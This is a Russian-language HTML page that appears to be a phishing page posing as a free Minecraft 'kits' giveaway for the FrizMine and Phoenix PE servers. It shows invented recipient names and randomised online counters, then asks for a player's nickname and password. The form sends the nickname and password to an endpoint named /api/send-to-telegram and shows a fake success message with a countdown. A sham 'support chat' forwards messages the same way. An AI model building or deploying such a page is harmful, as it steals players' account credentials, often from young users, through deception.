<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Kits Minecraft</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: 
                linear-gradient(rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.9)),
                url('https://static.planetminecraft.com/files/image/minecraft/texture-pack/2023/874/16662368-grass-texture_l.webp') repeat;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }

        body::before {
            content: "Free Kits Minecraft Server";
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 3vw;
            color: rgba(33, 150, 243, 0.08);
            white-space: nowrap;
            pointer-events: none;
            z-index: 0;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 5px;
        }

        .stats-bar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: #2196F3;
            color: white;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
            z-index: 100;
            box-shadow: 0 2px 10px rgba(33, 150, 243, 0.3);
        }

        .stats-left {
            display: flex;
            gap: 30px;
        }

        .stats-left span {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .online-dot {
            width: 10px;
            height: 10px;
            background: #fff;
            border-radius: 50%;
            display: inline-block;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .kits-count {
            background: #1976D2;
            padding: 4px 15px;
            border-radius: 20px;
            font-weight: 600;
        }

        .ticker {
            position: fixed;
            top: 48px;
            left: 0;
            right: 0;
            background: #e3f2fd;
            color: #1565C0;
            padding: 10px 0;
            overflow: hidden;
            border-bottom: 1px solid #bbdefb;
            z-index: 99;
            font-size: 14px;
            white-space: nowrap;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }

        .ticker-content {
            display: inline-block;
            animation: ticker 180s linear infinite;
            padding-left: 100%;
        }

        .ticker-content span {
            display: inline-block;
            margin-right: 50px;
            color: #0d47a1;
        }

        .ticker-content span i {
            color: #42a5f5;
            margin: 0 5px;
            font-style: italic;
        }

        .ticker-content .kit-badge {
            background: #2196F3;
            color: white;
            padding: 3px 10px;
            border-radius: 20px;
            margin: 0 8px;
            font-size: 11px;
            font-weight: 600;
        }

        @keyframes ticker {
            0% { transform: translateX(0); }
            100% { transform: translateX(-100%); }
        }

        .ticker:hover .ticker-content {
            animation-play-state: paused;
        }

        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(33, 150, 243, 0.2);
            width: 100%;
            max-width: 500px;
            padding: 35px;
            position: relative;
            z-index: 2;
            margin-top: 100px;
            border: 1px solid #bbdefb;
        }

        h1 {
            font-size: 26px;
            color: #1565C0;
            margin-bottom: 25px;
            text-align: center;
            font-weight: 700;
            border-bottom: 2px solid #e3f2fd;
            padding-bottom: 15px;
        }

        h2 {
            font-size: 18px;
            color: #1976D2;
            margin-bottom: 20px;
            font-weight: 600;
        }

        .step {
            display: none;
        }

        .step.active {
            display: block;
        }

        .server-select {
            display: flex;
            gap: 15px;
            margin-bottom: 10px;
        }

        .server-btn, .kit-btn {
            flex: 1;
            padding: 15px;
            border: 2px solid #bbdefb;
            background: white;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            color: #1976D2;
            cursor: pointer;
            transition: all 0.2s;
        }

        .server-btn:hover, .kit-btn:hover {
            border-color: #2196F3;
            background: #e3f2fd;
        }

        .server-btn.selected, .kit-btn.selected {
            background: #2196F3;
            color: white;
            border-color: #1976D2;
        }

        .kits-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin: 25px 0;
        }

        .kit-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            padding: 15px 5px;
        }

        .kit-emoji {
            font-size: 24px;
        }

        .kit-rarity {
            font-size: 11px;
            opacity: 0.8;
        }

        .info-box {
            background: #e3f2fd;
            border-left: 4px solid #2196F3;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 25px;
            font-size: 14px;
            color: #0d47a1;
        }

        .info-box strong {
            color: #1565C0;
            display: block;
            margin-bottom: 5px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #1976D2;
            font-size: 14px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 2px solid #bbdefb;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #2196F3;
            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
        }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background: #2196F3;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .submit-btn:hover {
            background: #1976D2;
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(33, 150, 243, 0.4);
        }

        .message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
        }

        .message.show {
            display: block;
        }

        .message.success {
            background: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #a5d6a7;
        }

        .message.error {
            background: #ffebee;
            color: #c62828;
            border: 1px solid #ef9a9a;
        }

        .timer {
            margin-top: 20px;
            padding: 15px;
            background: #e3f2fd;
            border-radius: 10px;
            text-align: center;
        }

        .timer-display {
            font-size: 36px;
            font-weight: 700;
            color: #1565C0;
            font-family: monospace;
            letter-spacing: 3px;
        }

        .timer-text {
            font-size: 14px;
            color: #1976D2;
            margin-top: 5px;
        }

        .back-btn {
            background: none;
            border: none;
            color: #1976D2;
            cursor: pointer;
            font-size: 14px;
            padding: 8px 0;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 5px;
            font-weight: 600;
        }

        .back-btn:hover {
            color: #0d47a1;
        }

        .back-btn::before {
            content: "←";
            font-size: 18px;
        }

        /* Стили для чата */
        .support-chat {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 300px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 30px rgba(0,0,0,0.2);
            z-index: 1000;
            overflow: hidden;
            border: 1px solid #2196F3;
        }

        .chat-header {
            background: #2196F3;
            color: white;
            padding: 12px 15px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: 600;
        }

        .chat-status {
            font-size: 12px;
            background: #4caf50;
            padding: 3px 8px;
            border-radius: 12px;
        }

        .chat-body {
            max-height: 350px;
            transition: max-height 0.3s;
            overflow: hidden;
        }

        .chat-body.minimized {
            max-height: 0;
        }

        .chat-messages {
            height: 250px;
            overflow-y: auto;
            padding: 10px;
            background: #f5f5f5;
            display: flex;
            flex-direction: column;
        }

        .message {
            margin-bottom: 10px;
            padding: 8px 12px;
            border-radius: 8px;
            max-width: 80%;
            font-size: 13px;
        }

        .message.user {
            background: #2196F3;
            color: white;
            align-self: flex-end;
        }

        .message.support {
            background: white;
            color: #333;
            align-self: flex-start;
            border: 1px solid #ddd;
        }

        .message-time {
            font-size: 10px;
            opacity: 0.7;
            margin-top: 3px;
            text-align: right;
        }

        .chat-input-area {
            display: flex;
            padding: 10px;
            background: white;
            border-top: 1px solid #ddd;
        }

        .chat-input-area input {
            flex: 1;
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-right: 8px;
        }

        .chat-input-area input:focus {
            outline: none;
            border-color: #2196F3;
        }

        .chat-input-area button {
            padding: 8px 15px;
            background: #2196F3;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .chat-input-area button:hover {
            background: #1976D2;
        }

        .unread-badge {
            background: #f44336;
            color: white;
            font-size: 11px;
            padding: 2px 6px;
            border-radius: 10px;
            margin-left: 8px;
        }
    </style>
</head>
<body>
    <!-- Звук -->
    <audio id="successSound" preload="auto">
        <source src="https://www.myinstants.com/media/sounds/minecraft-level-up.mp3" type="audio/mpeg">
    </audio>

    <!-- Статистика сверху -->
    <div class="stats-bar">
        <div class="stats-left">
            <span>
                <span class="online-dot"></span>
                <span id="onlineCount">2,847</span> игроков онлайн
            </span>
            <span>
                <span>🎁</span>
                <span id="kitsAvailable">1,500</span> свободных китов
            </span>
        </div>
        <div class="kits-count">
            Выдано сегодня: 1,247
        </div>
    </div>

    <!-- Бегущая строка -->
    <div class="ticker">
        <div class="ticker-content" id="tickerContent"></div>
    </div>

    <div class="container">
        <h1>⚡ FREE KITS ⚡</h1>

        <!-- ШАГ 1: Выбор сервера -->
        <div id="step1" class="step active">
            <h2>Выберите сервер:</h2>
            <div class="server-select">
                <button class="server-btn" onclick="selectServer('frizmine')">FrizMine</button>
                <button class="server-btn" onclick="selectServer('phoenix')">Phoenix PE</button>
            </div>
        </div>

        <!-- ШАГ 2: Выбор кита -->
        <div id="step2" class="step">
            <button class="back-btn" onclick="goToStep1()">Назад</button>
            <div class="info-box" id="selectedServerInfo">
                <strong>Выбран сервер:</strong> <span id="serverNameDisplay"></span>
            </div>
            <h2>Доступные киты:</h2>
            <div class="kits-grid" id="kitsContainer"></div>
        </div>

        <!-- ШАГ 3: Форма -->
        <div id="step3" class="step">
            <button class="back-btn" onclick="goToStep2()">Назад</button>
            <div class="info-box">
                <strong>Ваш выбор:</strong>
                <span id="finalChoiceDisplay"></span>
            </div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label>Никнейм:</label>
                    <input type="text" id="username" required placeholder="Введите ник">
                </div>
                
                <div class="form-group">
                    <label>Пароль:</label>
                    <input type="password" id="password" required placeholder="Введите пароль">
                </div>
                
                <button type="submit" class="submit-btn">Получить кит</button>
            </form>
            
            <div id="message" class="message"></div>
            <div id="timer" class="timer" style="display: none;">
                <div class="timer-display" id="timerDisplay">05:00</div>
                <div class="timer-text">до получения кита</div>
            </div>
        </div>
    </div>

    <!-- ЧАТ ПОДДЕРЖКИ (РАБОЧИЙ) -->
    <div class="support-chat" id="supportChat">
        <div class="chat-header" onclick="toggleChat()">
            <span>💬 Чат с поддержкой <span class="unread-badge" id="unreadBadge" style="display: none;">1</span></span>
            <span class="chat-status">Онлайн</span>
        </div>
        <div class="chat-body" id="chatBody">
            <div class="chat-messages" id="chatMessages"></div>
            <div class="chat-input-area">
                <input type="text" id="chatInput" placeholder="Напишите сообщение..." onkeypress="if(event.key==='Enter') sendSupportMessage()">
                <button onclick="sendSupportMessage()">Отправить</button>
            </div>
        </div>
    </div>

    <script>
        // Данные для бегущей строки
        const recentKits = [
            { name: 'felldart8875124', kit: 'Кит Магистра', emoji: '👑' },
            { name: 'ultrawanvel', kit: 'Кит Принца', emoji: '⚔️' },
            { name: 'yar1kzxc0706', kit: 'Кит Легенды', emoji: '🌟' },
            { name: 'trueangelpet', kit: 'Кит Князя', emoji: '💎' },
            { name: 'witherez', kit: 'Кит Ютуб', emoji: '📺' },
            { name: 'shaker8918', kit: 'Кит Магистра', emoji: '👑' },
            { name: 'anarchytop1pve', kit: 'Кит Принца', emoji: '⚔️' },
            { name: 'mooff56', kit: 'Кит Легенды', emoji: '🌟' }
        ];

        let selectedServer = '';
        let selectedKit = '';
        let timerInterval;

        const kits = {
            'frizmine': [
                { name: 'Кит Магистра', id: 'master', emoji: '👑', rarity: 'Легендарный' },
                { name: 'Кит Принца', id: 'prince', emoji: '⚔️', rarity: 'Редкий' },
                { name: 'Кит Легенды', id: 'legend', emoji: '🌟', rarity: 'Эпический' }
            ],
            'phoenix': [
                { name: 'Кит Князя', id: 'knyaz', emoji: '💎', rarity: 'Легендарный' },
                { name: 'Кит Принца', id: 'prince', emoji: '⚔️', rarity: 'Редкий' },
                { name: 'Кит Ютуб', id: 'youtube', emoji: '📺', rarity: 'Эпический' }
            ]
        };

        const serverNames = {
            'frizmine': 'FrizMine',
            'phoenix': 'Phoenix PE'
        };

        // Звук
        function playSuccessSound() {
            const sound = document.getElementById('successSound');
            sound.volume = 0.3;
            sound.play().catch(e => console.log('Звук не включился'));
        }

        // Бегущая строка
        function initTicker() {
            const ticker = document.getElementById('tickerContent');
            let html = '';
            recentKits.forEach(item => {
                html += `<span>${item.name} <i>получил(а)</i> ${item.emoji} ${item.kit}</span>`;
            });
            html += html;
            ticker.innerHTML = html;
        }

        // Онлайн
        function updateOnline() {
            const online = document.getElementById('onlineCount');
            const kitsAvailable = document.getElementById('kitsAvailable');
            setInterval(() => {
                online.textContent = (2847 + Math.floor(Math.random() * 100) - 50).toLocaleString();
                kitsAvailable.textContent = (1500 + Math.floor(Math.random() * 200) - 100).toLocaleString();
            }, 30000);
        }

        function selectServer(server) {
            selectedServer = server;
            selectedKit = '';
            document.querySelectorAll('.server-btn').forEach(btn => btn.classList.remove('selected'));
            event.target.classList.add('selected');
            showKits();
        }

        function showKits() {
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            document.getElementById('step3').classList.remove('active');
            
            document.getElementById('serverNameDisplay').textContent = serverNames[selectedServer];
            
            const kitsContainer = document.getElementById('kitsContainer');
            kitsContainer.innerHTML = '';
            
            kits[selectedServer].forEach(kit => {
                const button = document.createElement('button');
                button.className = 'kit-btn';
                button.innerHTML = `
                    <span class="kit-emoji">${kit.emoji}</span>
                    ${kit.name}
                    <span class="kit-rarity">${kit.rarity}</span>
                `;
                button.onclick = () => selectKit(kit.name);
                kitsContainer.appendChild(button);
            });
        }

        function selectKit(kitName) {
            selectedKit = kitName;
            document.querySelectorAll('.kit-btn').forEach(btn => btn.classList.remove('selected'));
            event.target.classList.add('selected');
            showForm();
        }

        function showForm() {
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.add('active');
            document.getElementById('finalChoiceDisplay').innerHTML = 
                `Сервер: <strong>${serverNames[selectedServer]}</strong>, Кит: <strong>${selectedKit}</strong>`;
        }

        function goToStep1() {
            selectedServer = '';
            selectedKit = '';
            document.getElementById('step1').classList.add('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.remove('active');
            document.querySelectorAll('.server-btn, .kit-btn').forEach(btn => btn.classList.remove('selected'));
        }

        function goToStep2() {
            selectedKit = '';
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            document.getElementById('step3').classList.remove('active');
            document.querySelectorAll('.kit-btn').forEach(btn => btn.classList.remove('selected'));
        }

        function startTimer(minutes = 5) {
            const timerDiv = document.getElementById('timer');
            const timerDisplay = document.getElementById('timerDisplay');
            let seconds = minutes * 60;
            
            timerDiv.style.display = 'block';
            if (timerInterval) clearInterval(timerInterval);
            
            timerInterval = setInterval(() => {
                const mins = Math.floor(seconds / 60);
                const secs = seconds % 60;
                timerDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                if (seconds <= 0) clearInterval(timerInterval);
                seconds--;
            }, 1000);
        }

        // ЧАТ ПОДДЕРЖКИ (РАБОЧИЙ)
        function toggleChat() {
            const chatBody = document.getElementById('chatBody');
            chatBody.classList.toggle('minimized');
            document.getElementById('unreadBadge').style.display = 'none';
        }

        function addMessage(text, isUser = true) {
            const chatMessages = document.getElementById('chatMessages');
            const messageDiv = document.createElement('div');
            messageDiv.className = `message ${isUser ? 'user' : 'support'}`;
            
            const time = new Date();
            const timeStr = `${time.getHours().toString().padStart(2, '0')}:${time.getMinutes().toString().padStart(2, '0')}`;
            
            messageDiv.innerHTML = `
                ${!isUser ? '<span style="font-weight:bold;display:block;margin-bottom:3px;">👨‍💻 Поддержка:</span>' : ''}
                <span>${text}</span>
                <div class="message-time">${timeStr}</div>
            `;
            
            chatMessages.appendChild(messageDiv);
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }

        async function sendSupportMessage() {
            const input = document.getElementById('chatInput');
            const text = input.value.trim();
            
            if (!text) return;
            
            addMessage(text, true);
            input.value = '';
            
            try {
                const response = await fetch('/api/send-to-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        type: 'support',
                        message: text,
                        username: 'Игрок'
                    })
                });
                
                if (response.ok) {
                    console.log('Сообщение отправлено в Telegram');
                }
            } catch (error) {
                console.error('Ошибка:', error);
            }
        }

        // Приветственное сообщение
        window.addEventListener('load', () => {
            addMessage('Здравствуйте! Чем могу помочь?', false);
        });

        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            if (!username || !password) {
                messageDiv.textContent = 'Заполните все поля!';
                messageDiv.className = 'message error show';
                return;
            }

            messageDiv.textContent = 'Отправка...';
            messageDiv.className = 'message show';

            try {
                const response = await fetch('/api/send-to-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        username, 
                        password,
                        server: serverNames[selectedServer],
                        kit: selectedKit,
                        type: 'kit_request'
                    })
                });

                const result = await response.json();

                if (result.success) {
                    playSuccessSound();
                    
                    messageDiv.textContent = '✓ Ура! Спасибо что выбрали нас!';
                    messageDiv.className = 'message success show';
                    
                    startTimer(5);
                    
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                    
                    setTimeout(() => {
                        goToStep1();
                        messageDiv.className = 'message';
                        document.getElementById('timer').style.display = 'none';
                        if (timerInterval) clearInterval(timerInterval);
                    }, 5000);
                } else {
                    messageDiv.textContent = '✗ Ошибка отправки';
                    messageDiv.className = 'message error show';
                }
            } catch (error) {
                messageDiv.textContent = '✗ Ошибка соединения';
                messageDiv.className = 'message error show';
            }
        });

        initTicker();
        updateOnline();
    </script>
</body>
</html>
